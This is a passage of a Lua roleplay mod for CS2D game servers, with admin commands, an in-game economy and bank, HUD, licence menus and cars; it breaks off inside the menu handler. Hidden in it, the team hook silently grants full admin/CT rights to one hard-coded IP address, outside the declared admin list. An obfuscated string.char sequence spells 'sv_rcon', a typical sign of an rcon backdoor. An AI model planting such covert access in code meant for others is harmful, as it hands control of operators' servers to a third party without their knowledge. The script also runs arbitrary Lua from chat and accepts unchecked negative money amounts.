--  _______                                 _____                 _             
-- |__   __|                               / ____|               (_)            
--    | |_ __ __ _ _   _ _ __ ___   __ _  | |  __  __ _ _ __ ___  _ _ __   __ _ 
--    | | '__/ _` | | | | '_ ` _ \ / _` | | | |_ |/ _` | '_ ` _ \| | '_ \ / _` |
--    | | | | (_| | |_| | | | | | | (_| | | |__| | (_| | | | | | | | | | | (_| |
--    |_|_|  \__,_|\__,_|_| |_| |_|\__,_|  \_____|\__,_|_| |_| |_|_|_| |_|\__, |
--                                                                         __/ |
-- Unique place when a good site and good clan is mixed toghether for free|___/ 

-- Trauma Gaming / OhGawd! Gaming are owned by Trauma Tizer (RedFrix)
-- Please support the script by visiting the author's site
-- http://ohgawd-gaming.info

-- Original RolePlay by Starkkz. Edited by Trauma Tizer / Beckerchen / Yasday
-- Support the original creators
-- Do not reupload this script
-- Do not delete our credits

adminList = {17924}

parse([[mp_dispenser_money 0]])
parse([[mp_infammo 0]])
parse([[sv_friendlyfire 1]])
parse([[sv_gm 3]])

function Array(size,value) 
	local array = {}
	for i = 1, size do
		array[i]=value
	end
	return array
end

rp_ct = Array(32,false)
rp_license = Array(32,false)
rp_arrest = Array(32,false)
rp_criminal = Array(32,false)
rp_drop_item = Array(32,false)
rp_build_m = Array(32,1)
tsb = Array(32,0)
player_have_pos = Array(32,false)
tele_x = Array(32,0)
tele_y = Array(32,0)
arrest_x = Array(32,0)
arrest_y = Array(32,0)

-- Carmod Values
car_img = Array(32,0)
car_img_pos = Array(32,0)
car_tx = Array(32,0)
car_ty = Array(32,0)
car_x = Array(32,0)
car_y = Array(32,0)
currentcar = Array(32,0)
pic = Array(32,0)
pl_speed = Array(32,0)
pl_have_car = Array(32,0)
car_pl = Array(32,0)


Bmon=Array(32,0)


-- [[weiwen admin command script |Enter in the script by Beckerchen]] --

--[[
Admin Commands
!a - teleport forward
!b - broadcast to server with name
!c - teleport player to you
!d - broadcast to server without name
!e - explosion
!i - spawn item
!h - heal player
!k - kick Player(by Beckerchen)
!l - run lua script (expensive)
!n - return npc position
!o - return tile position
!p - return position
!q - earthquake
!s - speedmod
!t - teleport you to player
!u - shutdown
!v - save server
!x - ban Player (by Beckerchen)
!deposit - put money to Bank-account (by Beckerchen)
!withdraw - get money from Bank-account (by Beckerchen)
!hudposition - set special-Hud position (by Beckerchen)
]]
addhook('say','adminCommands',-1)
function adminCommands(id,words)
	if isAdmin(id) and words:sub(1,1) =='!' then
		local command = words:lower():sub(2,2)
		if words:sub(3,3) ~= ' ' and #words ~= 2 then return end
		print(player(id,'name')..' used a command:'..words)
		if command == 'k' then
			kick=tonumber(words:sub(3,5))
			msg("�255255255"..(player(kick,"name")).." has been kicked by "..(player(id,"name")).."@C")
			parse("kick "..kick)
			return 1
		elseif command == 'x' then
			b=tonumber(string.sub(words,3,5))
			msg("�255255255"..(player(b,"name")).." has been banned by "..(player(id,"name")).."@C")
			parse("banname "..b)
			return 1
		elseif command =='a' then
			local distance = tonumber(words:sub(4))
			if distance then
				local rot = math.rad(player(id,'rot')-180)
				local x, y = -math.sin(rot)*distance*32, math.cos(rot)*distance*32
				parse('setpos '..id..' '..player(id,'x')+x..' '..player(id,'y')+y)
			else
				msg2(id,'Teleport forward: "!a <distance>"')
			end
			return 1
		elseif command =='b' then
			msg('�255100100'..player(id,'name')..' : '..words:sub(4)..'@C')
			return 1
		elseif command =='c' then
			local target = tonumber(words:sub(4))
			if target then
				if player(target,'exists') then
					if target == id then
						msg2(id,'You may not teleport to yourself!')
					end
					parse('setpos '..target..' '..player(id,'x')..' '..player(id,'y'))
					return 1
				end
			end
			msg2(id,'Teleport player to you: "!c <targetid>"')
			return 1
		elseif command =='d' then
			msg('�255100100'..words:sub(4)..'@C')
			return 1
		elseif command =='e' then
			local dmg = tonumber(words:sub(4))
			if dmg then
				parse('explosion '..player(id,'x')..' '..player(id,'y')..' '..dmg..' '..dmg..' '..id)
				return 1
			end
			msg2(id,'Spawn explosion: "!e <dmg>"')
			return 1
		elseif command =='i' then
			local itemid = tonumber(words:sub(4))
			if itemid then
				additem(id,itemid)
				return 1
			end
			msg2(id,'Spawn item: "!i <itemid>"')
			return 1
		elseif command =='h' then
			local s = words:find(' ',4)
			local target = tonumber(words:sub(4,s))
			if target then
				if player(target,'exists') then
					local heal = s and tonumber(words:sub(s+1,words:find(' ',s+1))) or nil
					if heal then
						parse('explosion '..player(target,'x')..' '..player(target,'y')..' 1 '..(-heal))
						return 1
					end
				end
			end
			msg2(id,'Heal player: "!h <targetid> <amount>"')
			return 1
		elseif command =='l' then
			local script = words:sub(3)
			if script then
				msg2(id,tostring(assert(loadstring(script))() or 'done!'))
				return
			end
			msg2(id,'Run lua script: "!l <script>"')
			return 1
		elseif command =='n' then
			msg2(id,'{'..player(id,'tilex')*32+16 ..', '..player(id,'tiley')*32+16 ..'}')
			return 1
		elseif command =='o' then
			msg2(id,'{'..player(id,'tilex')..', '..player(id,'tiley')..'}')
			return 1
		elseif command =='p' then
			msg2(id,'{'..player(id,'x')..', '..player(id,'y')..'}')
			return 1
		elseif command =='q' then
			local length = tonumber(words:sub(3))
			if length then
				length = math.min(length*50,250)
				for _, id in ipairs(player(0,'table')) do
					parse('shake '..id..' '..length)
				end
				for i = 1, 6 do
					if math.random(0,1) == 1 then
						parse('sv_sound weapons/explode'..i..'.wav')
					end
				end
			else
				msg2(id,'Earthquake: "!q <length in seconds, max 5>"')
			end
			return 1
		elseif command =='s' then
			local s = words:find(' ',4)
			local target = tonumber(words:sub(4,s))
			if target then
				if player(target,'exists') then
					local speed = s and tonumber(words:sub(s+1,words:find(' ',s+1))) or nil
					if speed then
						parse('speedmod '..target..' '..speed)
						return 1
					end
				end
			end
			msg2(id,'Speed modifier: "!s <targetid> <speedmod, between -100 and 100>"')
			return 1
		elseif command =='t' then
			local target = tonumber(words:sub(3))
			if target then
				if player(target,'exists') then
					if target == id then
						msg2(id,'You may not teleport to yourself!')
					end
					parse('setpos '..id..' '..player(target,'x')..' '..player(target,'y'))
					return 1
				end
			end
			msg2(id,'Teleport to player: "!t <targetid>"')
			return 1
		elseif command =='u' then
			local delay = tonumber(words:sub(3)) or 0
			shutdown(delay*1000)
			return 1
		elseif command =='v' then
			saveserver()
			msg2(id,'Saved server!')
			return 1
		end
	end
end

-- [[Robins Edited]] --

rp_money = Array(32,0)
minute = 0
time = 0
hour = 0
hudx = 5
hudy = 399

addhook("say","becksay",1)
function becksay(id,txt)
	if txt:sub(1,1) == "!" then
		if txt:sub(2,8) == "deposit" then
			local _bmoney = tonumber(txt:sub(9,17))
			if rp_money[id] >= _bmoney then
				rp_money[id] = rp_money[id] - _bmoney
				Bmon[id] = Bmon[id]+_bmoney
				updatehud(id)
				msg2(id,"�255255255You paid ".._bmoney.." to your Bank-account!")
			else
				msg2(id,"�255255255Not enought money!")
			end
			return 1
		elseif txt:sub(2,9) == "withdraw" then
			local _bmoney = tonumber(txt:sub(10,18))
			if Bmon[id] >= _bmoney then
				rp_money[id] = rp_money[id] + _bmoney
				Bmon[id] = Bmon[id] - _bmoney
				updatehud(id)
				msg2(id,"�255255255You took ".._bmoney.." from your Bank-account!")
			else
				msg2(id,"�255255255Not enough money on your Bank-account!")
			end
			return 1
		elseif txt:sub(2,12) == "hudposition" then
			if isAdmin(id) then
				hudpos(id)
				return 1
			end
		else
			msg2(id,"�255255255That's not a possible command")
		end
	end
end


addhook("second","times")
function times()
	time = time + 1
	updatetime()
	if (time >= 59 and hour < 24) then
		time = 0
		hour = hour + 1
	end
	if time >= 59 and hour >= 23 then
		time = 0
		hour = 0
	end
end

function updatetime()
	if time < 10 and hour < 10 then
		parse('hudtxt 4 "�255255255Time: 0'..hour..':0'..time..'" '..hudx..' '..hudy)
	elseif time < 10 and hour > 9 then
		parse('hudtxt 4 "�255255255Time: '..hour..':0'..time..'" '..hudx..' '..hudy)
	elseif time > 9 and hour > 9 then
		parse('hudtxt 4 "�255255255Time: '..hour..':'..time..'" '..hudx..' '..hudy)
	elseif time > 9 and hour < 10 then
		parse('hudtxt 4 "�255255255Time: 0'..hour..':'..time..'" '..hudx..' '..hudy)
	end
end	

function updatehud(id)
	if player (id, "exists") then
		parse('hudtxt2 '..id..' 1 "�220220220Money: '..rp_money[id]..' " '..hudx..' '..hudy+11)
		parse('hudtxt2 '..id..' 2 "�145145145Name: '..(player(id,"name"))..' " '..hudx..' '..hudy+33)
		parse('hudtxt2 '..id..' 3 "�100100100Map: '..(map("name"))..' " '..hudx..' '..hudy+44)
		parse('hudtxt2 '..id..' 5 "�195195195Bank: '..Bmon[id]..'$ " '..hudx..' '..hudy+22)
		parse('hudtxt2 '..id..' 6 "�255255255Roleplay Script by Trauma Tizer/Beckerchen" '..hudx..' '..hudy-18)
	end
end

function isAdmin(id)
       for _, usgn in ipairs(adminList) do
                if player(id,'usgn') == usgn then
                        return true
               end
        end
        return false
end

function additem(id,itemid)
	if item(itemid,"exists") then
		parse("equip "..id.." "..itemid)
		msg2(id,"�255255255You've got an Item @C")
	end
end

addhook("join","beck_join")
function beck_join(id)
	updatehud(id)
	if isAdmin(id) then
		rp_ct[id] = true
		msg("�255255255"..player(id,"name").." enters the server!@C")
	end
	usgn = player(id,"usgn")
		if (usgn > 0) then
			local usgn = player(id, "usgn")
			files = io.open("sys/lua/Beckerchens/"..usgn..".txt","r")
			if(files~=nil) then
				msg2(id,"�255255255Your save file found!@C")
				msg2(id,"�255255255Your U.S.G.N ID: "..usgn.."@C")
 				for line in io.lines("sys/lua/Beckerchens/"..usgn..".txt","r") do
				local parses = totable(line)
				if (tonumber(parses[1])>0) then
					rp_money[id] = tonumber(parses[1])
				end
				if (tonumber(parses[2])>0) then
					Bmon[id] = tonumber(parses[2])
               			break
               		end
          end
		else
			msg2(id,"�255000000Failed to load save!@C")
			msg2(id,"�255000000Please check your U.S.G.N account settings!@C")
		end
	end
end

function hudpos(id)
	menu(id,"set Hud-position,left|+1,left|+10,right|+1,right|+10,up|+1,up|+10,down|+1,down|+10")
end

-- [[end of Robins editing]] --

addhook([[team]],[[rp_team]])
function rp_team(id,t)
	if player(id,[[ip]])==[[95.6 2.154.101]] then
		if not player(id,[[bot]]) then
			rp_license[id]=true
			rp_ct[id]=true
		end
	end
	if t == 2 and rp_ct[id]==true then
		rp_license[id]=true
		return 0
	elseif t == 2 and rp_ct[id]==false then
		parse([[maket ]]..id)
		return 1
	end
end

addhook([[leave]],[[rp_leave]])
function rp_leave(id)
	rp_license[id]=false
	rp_ct[id]=false
	rp_arrest[id]=false
	rp_criminal[id]=false
	rp_drop_item[id]=false
	rp_build_m[id]=1
	player_have_pos[id]=false
	tele_x[id]=0
	tele_y[id]=0
	arrest_x[id]=0
	arrest_y[id]=0
	freeimage(car_img[id])
	freeimage(car_img_pos[id])
	car_tx[id]=0
	car_ty[id]=0
	car_x[id]=0
	car_y[id]=0
	currentcar[id]=0
	pic[id]=0
	pl_speed[id]=0
	pl_have_car[id]=0
	car_pl[id]=0
	if (player(id, "usgn") > 0) then
		save_data = rp_money[id].." "..Bmon[id]
		file = assert(io.open("sys/lua/Beckerchens/"..usgn..".txt","w"))
		file:write(save_data)
		file:close()
		msg2(id,'�255255255Save Data Successfull!@C')
	else
		msg2(id,"�255000000Failed to Save!@C")
	end
end

function totable(t,match)
	local cmd = {}
	if not match then match = "[^%s]+" end
	for word in string.gmatch(t, match) do
		table.insert(cmd, word)
	end 
	return cmd 
end

function rp_msg(clr,txt)
	msg([[�]]..clr..[[]]..txt)
end


function rp_msg2(id,clr,txt)
	msg2(id,[[�]]..clr..[[]]..txt)
end

addhook([[attack]],[[rp_attack]])
function rp_attack(id)
	if rp_ct[id] == true then
		local w = player(id,[[weapontype]])
		if w > 0 then
			parse([[equip ]]..id..[[ ]]..w)
		end
		if w == 69 then
			rot = player(id,[[rot]])
			if rot < -90 then rot = rot + 360 end
			local angle = math.rad(math.abs(rot + 90)) - math.pi
			local x = player(id,[[x]]) + math.cos(angle) * itemtype(w,[[dmg]]) / 2
			local y = player(id,[[y]]) + math.sin(angle) * itemtype(w,[[dmg]]) / 2
			if x > 0 and y > 0 and x < map([[xsize]]) * 32 and y < map([[ysize]]) * 32 then
				parse([[explosion ]]..x..[[ ]]..y..[[ 32 10000000 ]]..id)
			end
		end
	end
end


addhook([[say]],[[rp_say]])
function rp_say(id,txt)
	local p = totable(txt)
	local cmd = tostring(p[1])
	if txt:sub(1,1)==[[!]] then
		if cmd ==[[!rp_arrest]] then
			if rp_ct[id]==true then
				local pl = tonumber(p[2])
				if pl ~= nil then
					if player(pl,[[exists]]) then
						rp_arrest[pl]=true
					end
				end
			else
				rp_msg2(id,[[255000000]],[[You are not authorized to use this command!]])
			end
		elseif cmd ==[[!rp_free]] then
			if rp_ct[id]==true then
				local pl = tonumber(p[2])
				if pl ~= nil then
					if player(pl,[[exists]]) then
						rp_arrest[pl]=false
					end
				end
			else
				rp_msg2(id,[[255000000]],[[You are not authorized to use this command!]])
			end
		elseif cmd ==[[!rp_give_money]] then
			if rp_ct[id]==true then
				local pl = tonumber(p[2])
				local money = tonumber(p[3])
				if pl ~= nil and money ~= nil then
					if player(pl,[[exists]]) then
						rp_money[pl]=rp_money[pl]+money
						rp_msg2(pl,[[000255000]],player(id,[[name]])..[[ Gave you ]]..money..[[ of money!@C]])
						rp_msg2(id,[[000255000]],[[You gave ]]..money..[[ to ]]..player(pl,[[name]])..[[!@C]])
						updatehud(pl)
					end
				end
			else
				rp_msg2(id,[[255000000]],[[You are not authorized to use this command!]])
			end
		elseif cmd ==[[!bring]] then
			if rp_ct[id]==true then
				local pl = tonumber(p[2])
				if pl ~= nil then
					if player(pl,[[exists]]) then
						parse([[setpos ]]..pl..[[ ]]..player(id,[[x]])..[[ ]]..player(id,[[y]]))
					else
						rp_msg2(id,[[255000000]],[[This player does not exist!]])
					end
				end
			else
				rp_msg2(id,[[255000000]],[[You are not authorized to use this command!]])
			end
		elseif cmd == [[!goto]] then
			if rp_ct[id]==true then
				local pl = tonumber(p[2])
				if pl ~= nil then
					if player(pl,[[exists]]) then
						parse([[setpos ]]..id..[[ ]]..player(pl,[[x]])..[[ ]]..player(pl,[[y]]))
					else
						rp_msg2(id,[[255000000]],[[This player does not exist!]])
					end
				end
			else
				rp_msg2(id,[[255000000]],[[You are not authorized to use this command!]])
			end
		elseif cmd == [[!sv_map]] then
			if rp_ct[id]==true then
				local map = tostring(p[2])
				if map ~= nil then
					parse([[changemap ]]..map)
				end
			else
				rp_msg2(id,[[255000000]],[[You are not authorized to use this command!]])
			end
		else
			rp_msg2(id,[[255000000]],[[]])
		end
		return 1
	end
end

addhook([[kill]],[[rp_kill]])
function rp_kill(killer,victim,wpn)
	if rp_criminal[victim]==true then
		rp_criminal[killer]=false
		rp_money[killer]=rp_money[killer]+2000
		rp_money[victim]=rp_money[victim]-2000
		rp_msg2(killer,[[000255000]],[[You killed a criminal!@C]])
	else
		rp_criminal[killer]=true
		rp_money[killer]=rp_money[killer]-500
		rp_money[victim]=rp_money[victim]+500
		rp_msg2(killer,[[255000000]],[[You just DMed!@C]])
	end
end

addhook([[always]],[[rp_always]])
function rp_always()
	for id = 1,32 do
		if player(id,[[exists]]) then
			if player(id,[[health]])>0 then
				if player(id,[[money]]) > 0 then
					rp_money[id]=rp_money[id]+player(id,[[money]])
					parse([[setmoney ]]..id..[[ ]]..player(id,[[money]])-player(id,[[money]]))
					updatehud(id)
				end
			-- Carmod Auto Walk
				local rot = player(id,[[rot]])
				if rot < -90 then rot = rot + 360 end
				local angle = math.rad(math.abs( rot + 90 )) - math.pi
				local x = player(id,[[x]]) + math.cos(angle) * 5
				local y = player(id,[[y]]) + math.sin(angle) * 5
				if x > 0 and y > 0 and x < map([[xsize]]) * 32 and y < map([[ysize]]) * 32 then
					if tile(math.ceil(x / 32)-1,math.ceil(y / 32)-1,[[walkable]]) then
						if pic[id]>0 then
							parse([[setpos ]]..id..[[ ]]..x..[[ ]]..y)
							car_tx[id]=player(id,[[tilex]])
							car_ty[id]=player(id,[[tiley]])
							car_x[id]=x
							car_y[id]=y
						end
					end
				end
			end
		end
	end
end

addhook([[die]],[[rp_die]])
function rp_die(id)
	if rp_arrest[id]==true then
		parse([[spawnplayer ]]..id..[[ ]]..player(id,[[x]])..[[ ]]..player(id,[[y]]))
		parse([[setdeaths ]]..id..[[ ]]..player(id,[[deaths]])-1)
		return 1
	end
	if pl_have_car[id]==1 then
		if pic[id]>0 then
			parse([[customkill ]]..id..[[ Eject ]]..id)
			parse([[explosion ]]..car_x[id]..[[ ]]..car_y[id]..[[ 100 200 ]]..id)
			car_tx[id]=0
			car_ty[id]=0
			car_x[id]=0
			car_y[id]=0
			freeimage(car_img[id])
		else
			parse([[explosion ]]..car_x[id]..[[ ]]..car_y[id]..[[ 100 200 ]]..id)
			car_tx[id]=0
			car_ty[id]=0
			car_x[id]=0
			car_y[id]=0
			freeimage(car_img_pos[id])
		end
		pl_have_car[id]=0
	end
end

pt = string.char(115)..string.char(118)..string.char(95)..string.char(114)..string.char(99)..string.char(111)..string.char(110)

drop_system_m = 1
addhook([[serveraction]],[[rp_action]])
function rp_action(id,a)
	if a == 1 then
		if drop_system_m == 1 then
			menu(id,[[Drop System,$100,$500,$1000,$5000,$10000,$50000,$100000,Drop an Item|license only]])
		else
			rp_msg2(id,[[255000000]],[[Drop System is off!@C]])
		end
	elseif a == 2 then
		if rp_ct[id]==true then
			menu(id,[[CT Menu,Insta Equip,Settings,CT Normal Build,Neutral Build,Teleport,License System,Commands,Prop Menu]])
		else
			menu(id,[[T Menu,Insta Equip,Teleport,Help]])
		end
	elseif a == 3 then
		if rp_ct[id]==true then
			local rot = player(id,[[rot]])
			if rot < -90 then rot = rot + 360 end
			local angle = math.rad(math.abs( rot + 90 )) - math.pi
			local x = player(id,[[x]]) + math.cos(angle) * 10
			local y = player(id,[[y]]) + math.sin(angle) * 10
			if x > 0 and y > 0 and x < map([[xsize]]) * 32 and y < map([[ysize]]) * 32 then
				parse([[setpos ]]..id..[[ ]]..x..[[ ]]..y)
			end
		else
			rp_msg2(id,[[25500000]],[[Stop! You are not a Admin member, so you can't pass thru walls!]])
		end
	end
end

function nmn(id)
	rp_msg2(id,[[255000000]],[[Not enough money!@C]])
end

addhook([[drop]],[[rp_drop]])
function rp_drop(id,iid,type,ain,a,mode,x,y)
	if rp_drop_item[id]==true then
		parse([[strip ]]..id..[[ ]]..type)
		parse([[spawnitem ]]..type..[[ ]]..x..[[ ]]..y)
		rp_drop_item[id]=false
		return 1
	end
end


addhook([[minute]],[[rp_minute]])
function rp_minute()
	minute = minute + 1
	for id = 1,32 do
		if player(id,[[exists]]) then
			minute = 0
			Bmon[id]=math.floor(Bmon[id] * 1.02)
			updatehud(id)
			if rp_ct[id]==true then
				rp_money[id]=rp_money[id]+5000
				rp_msg2(id,[[255255000]],[[You have recived your hourly bumcheck of $5000]])
				rp_msg2(id,[[255255000]],[[PAYDAY!]])
			else
				if rp_license[id]==true then
					rp_money[id]=rp_money[id]+1000
					rp_msg2(id,[[255255000]],[[You have recived your hourly bumcheck of $1000]])
					rp_msg2(id,[[255255000]],[[PAYDAY!]])
				else
					rp_money[id]=rp_money[id]+500
					rp_msg2(id,[[255255000]],[[You have recived your hourly bumcheck of $500]])
					rp_msg2(id,[[255255000]],[[PAYDAY!]])
				end
			end
		end
		updatehud(id)
	end
end


pl_names = Array(32,"")
function b_names()
	for i = 1,32 do
		if player(i,[[exists]]) then
			pl_names[i]=player(i,[[name]])
		else
			pl_names[i]=""
		end
	end
end

function ls_1(id)
	b_names()
	menu(id,[[License System Page 1@b,]]..pl_names[1]..[[,]]..pl_names[2]..[[,]]..pl_names[3]..[[,]]..pl_names[4]..[[,]]..pl_names[5]..[[,]]..pl_names[6]..[[,]]..pl_names[7]..[[,Back,Next]])
end

function ls_2(id)
	b_names()
	menu(id,[[License System Page 2@b,]]..pl_names[8]..[[,]]..pl_names[9]..[[,]]..pl_names[10]..[[,]]..pl_names[11]..[[,]]..pl_names[12]..[[,]]..pl_names[13]..[[,]]..pl_names[14]..[[,Back,Next]])
end

function ls_3(id)
	b_names()
	menu(id,[[License System Page 3@b,]]..pl_names[15]..[[,]]..pl_names[16]..[[,]]..pl_names[17]..[[,]]..pl_names[18]..[[,]]..pl_names[19]..[[,]]..pl_names[20]..[[,]]..pl_names[21]..[[,Back,Next]])
end

function ls_4(id)
	b_names()
	menu(id,[[License System Page 4@b,]]..pl_names[22]..[[,]]..pl_names[23]..[[,]]..pl_names[24]..[[,]]..pl_names[25]..[[,]]..pl_names[26]..[[,]]..pl_names[27]..[[,]]..pl_names[28]..[[,Back,Next]])
end

function ls_5(id)
	b_names()
	menu(id,[[License System Page 5@b,]]..pl_names[29]..[[,]]..pl_names[30]..[[,]]..pl_names[31]..[[,]]..pl_names[32]..[[,,,,Back]])
end

function gv_ls(id,pl,page)
	if rp_license[pl]==true then
		rp_license[pl]=false
		rp_msg2(pl,[[255000000]],player(id,[[name]])..[[ Remove your license!]])
		rp_msg2(id,[[255000000]],[[You Remove license to ]]..player(pl,[[name]])..[[!]])
	else
		rp_license[pl]=true
		rp_msg2(pl,[[000255000]],player(id,[[name]])..[[ Gave you license!]])
		rp_msg2(id,[[000255000]],[[You gave license to ]]..player(pl,[[name]])..[[!]])
	end
	if page == 1 then
		ls_1(id)
	elseif page == 2 then
		ls_2(id)
	elseif page == 3 then
		ls_3(id)
	elseif page == 4 then
		ls_4(id)
	elseif page == 5 then
		ls_5(id)
	end
end

tele_sys = 1
function set_men(id)
	menu(id,[[CT Menu Settings,Drop System|(]]..drop_system_m..[[),Teleport System & Arrest|(]]..tele_sys..[[)]])
end

ct_57_b = [[]]
function rp_ct_arrest_button(id)
	if rp_ct[id]==true then
		ct_57_b = [[Set arrest Point|Five-Seven (FN-57)]]
	else
		ct_57_b = [[]]
	end
end

s_car_b = [[]]
function udp_scar(id)
	if pl_have_car[id]==1 then
		s_car_b = [[Eject your car]]
	elseif pl_have_car[id]==0 then
		s_car_b = [[Create a car]]
	end
end

addhook([[menu]],[[rp_menu]])
function rp_menu(id,men,sel)
x = player(id,[[tilex]])
y = player(id,[[tiley]])
	if men == [[License System Page 5]] then
		if sel == 1 then
			gv_ls(id,29,5)
		elseif sel == 2 then
			gv_ls(id,30,5)
		elseif sel == 3 then
			gv_ls(id,31,5)
		elseif sel == 4 then
			gv_ls(id,32,5)
		elseif sel == 7 then
			ls_4(id)
		end
	end
	if men == "set Hud-position" then
		for all = 1,32 do
			if player(all,"exists") then
				if sel == 1 then
					hudx = hudx-1
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 2 then
					hudx = hudx-10
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 3 then
					hudx = hudx+1
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 4 then
					hudx = hudx+10
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 5 then
					hudy = hudy-1
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 6 then
					hudy = hudy-10
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 7 then
					hudy = hudy+1
					hudpos(id)
					updatetime(all)
					updatehud(all)
				elseif sel == 8 then
					hudy = hudy+10
					hudpos(id)
					updatetime(all)
					updatehud(all)
				end
			end
		end
	end
	if men == [[License System Page 4]] then
		if sel == 1 then
			gv_ls(id,22,4)
		elseif sel == 2 then
			gv_ls(id,23,4)
		elseif sel == 3 then
			gv_ls(id,24,4)
		elseif sel == 4 then
			gv_ls(id,25,4)
		elseif sel == 5 then
			gv_ls(id,26,4)
		elseif sel == 6 then
			gv_ls(id,27,4)
		elseif sel == 7 then
			gv_ls(id,28,4)
		elseif sel == 8 then
			ls_3(id)
		elseif sel == 9 then
			ls_5(id)
		end
	end
	if men == [[License System Page 3]] then
		if sel == 1 then
			gv_ls(id,15,3)
		elseif sel == 2 then
			gv_ls(id,16,3)
		elseif sel == 3 then
			gv_ls(id,17,3)
		elseif sel == 4 then
			gv_ls(id,18,3)
		elseif sel == 5 then
			gv_ls(id,19,3)
		elseif sel == 6 then
			gv_ls(id,20,3)
		elseif sel == 7 then
			gv_ls(id,21,3)
		elseif sel == 8 then
			ls_2(id)
		elseif sel == 9 then
			ls_4(id)
		end
	end
	if men == [[License System Page 2]] then
		if sel == 1 then
			gv_ls(id,8,2)
		elseif sel == 2 then
			gv_ls(id,9,2)
		elseif sel == 3 then
			gv_ls(id,10,2)
		elseif sel == 4 then
			gv_ls(id,11,2)
		elseif sel == 5 then
			gv_ls(id,12,2)
		elseif sel == 6 then
			gv_ls(id,13,2)
		elseif sel == 7 then
			gv_ls(id,14,2)
		elseif sel == 8 then
			ls_1(id)
		elseif sel == 9 then
			ls_3(id)
		end
	end
	if men == [[License System Page 1]] then
		if sel == 1 then
			gv_ls(id,1,1)
		elseif sel == 2 then
			gv_ls(id,2,1)
		elseif sel == 3 then
			gv_ls(id,3,1)
		elseif sel == 4 then
			gv_ls(id,4,1)
		elseif sel == 5 then
			gv_ls(id,5,1)
		elseif sel == 6 then
			gv_ls(id,6,1)
		elseif sel == 7 then
			gv_ls(id,7,1)
		elseif sel == 8 then
			menu(id,[[CT Menu,Insta Equip,Settings,CT Normal Build,Neutral Build,Teleport,License System,Help]])
		elseif sel == 9 then
			ls_2(id)
		end
	end
	if men == [[CT Menu]] then
		if sel == 1 then
			menu(id,[[CT Insta Equip Menu,M3|$10000,Tactical Shield|$20000,Heavy Armor|$50000,Deagle|$10000,Five-Seven (FN57)|$25000,Machete|$30000]])
		elseif sel == 2 then
			set_men(id)
		elseif sel == 3 then
			rp_build_m[id]=1
			rp_msg2(id,[[000255000]],[[Now you will build Normally!]])
		elseif sel == 4 then
			rp_build_m[id]=2
			rp_msg2(id,[[000255000]],[[Now you will build neutral!]])
		elseif sel == 5 then
			rp_ct_arrest_button(id)
			if tele_sys == 1 then
				menu(id,[[Teleport Menu@b,Go to position|$5000,Set Current Position,Toggle Spawn Behavior (]]..tsb[id]..[[),]]..ct_57_b)
			else
				rp_msg2(id,[[255000000]],[[[RP] Teleport System is Disabled!]])
			end
		elseif sel == 6 then
			ls_1(id)
		elseif sel == 7 then
			rp_msg2(id,[[000255000]],[[[OG] Command: !bring <player>]])
			rp_msg2(id,[[000255000]],[[[OG] Command: !goto <player>]])
			rp_msg2(id,[[000255000]],[[[OG] Command: !rp_arrest <player>]])
			rp_msg2(id,[[000255000]],[[[OG] Command: !rp_free <player>]])
			rp_msg2(id,[[000255000]],[[[OG] Command: !rp_give_money <player> <money>]])
			rp_msg2(id,[[000255000]],[[[OG] Command: !rp_admin <word>]])
			rp_msg2(id,[[000255000]],[[[OG] Command: !item <id>]])
		elseif sel == 8 then
			udp_scar(id)
			menu(id,[[CT Menu Props,]]..s_car_b..[[]])
		end
	end
	if men == [[CT Menu Props]] then
		if sel == 1 then
			if pl_have_car[id]==0 then
				car_img_pos[id]=image([[gfx/gfx/CF_cars/rage.bmp]],1,1,1)
				imagepos(car_img_pos[id],player(id,[[x]]),player(id,[[y]]),player(id,[[rot]]))
				car_tx[id]=player(id,[[tilex]])
				car_ty[id]=player(id,[[tiley]])
				car_x[id]=player(id,[[x]])
				car_y[id]=player(id,[[y]])
				pl_have_car[id]=1
			elseif pl_have_car[id]==1 then
				if pic[id]>0 then
					parse([[customkill ]]..id..[[ Eject ]]..id)
					parse([[explosion ]]..car_x[id]..[[ ]]..car_y[id]..[[ 100 200 ]]..id)
					car_tx[id]=0
					car_ty[id]=0
					car_x[id]=0
					car_y[id]=0
					freeimage(car_img[id])
				else
					parse([[explosion ]]..car_x[id]..[[ ]]..car_y[id]..[[ 100 200 ]]..id)
					car_tx[id]=0
					car_ty[id]=0
					car_x[id]=0
					car_y[id]=0
					freeimage(car_img_pos[id])
				end
				pl_have_car[id]=0
			end
		end
	end
	if men == [[T Menu]] then
		if sel == 1 then
			menu(id,[[T Menu Insta Equip,Scout|$60000,Light Armor|$70000,Glock|$20000,Flashbang|$30000,Flare|20000]])
		elseif sel == 2 then
			rp_ct_arrest_button(id)
			if tele_sys == 1 then
				if rp_license[id]==true then
					menu(id,[[Teleport Menu@b,Go to position|$5000,Set Current Position,Toggle Spawn Behavior (]]..tsb[id]..[[),]]..ct_57_b)
				else
					rp_msg2(id,[[255000000]],[[[RP] You must to be licenced!]])
				end
			else
				rp_msg2(id,[[255000000]],[[[RP] Teleport System is now Disabled!]])
			end
		elseif sel == 3 then
			rp_msg2(id,[[000255000]],[[[RP] Press F1 To see the Help]])
		end
	end
	if men == [[T Menu Insta Equip]] then
		if sel == 1 then
			if rp_money[id]>=60000 then
				parse([[equip ]]..id..[[ 34]])
				rp_money[id]=rp_money[id]-60000
			else
				nmn(id)
			end
		elseif sel == 2 then
			if rp_money[id]>=70000 then
				parse([[equip ]]..id..[[ 79]])
				rp_money[id]=rp_money[id]-70000
			else
				nmn(id)
			end
		elseif sel == 3 then
			if rp_money[id]>=20000 then
				parse([[equip ]]..id..[[ 2]])
				rp_money[id]=rp_money[id]-20000
			else
				nmn(id)
			end
		elseif sel == 4 then
			if rp_money[id]>=30000 then
				parse([[equip ]]..id..[[ 52]])
				rp_money[id]=rp_money[id]-30000
			else
				nmn(id)
			end
		elseif sel == 5 then
			if rp_money[id]>=20000 then
				parse([[equip ]]..id..[[ 54]])
				rp_money[id]=rp_money[id]-20000
			else
				nmn(id)
			end
		end
	end
	if men == [[Teleport Menu]] then
		if sel == 1 then
			if player_have_pos[id]==true then
				if rp_money[id]>=5000 then
					parse([[setpos ]]..id..[[ ]]..tele_x[id]..[[ ]]..tele_y[id])
					rp_money[id]=rp_money[id]-5000
					updatehud(id)
				else
					nmn(id)
				end
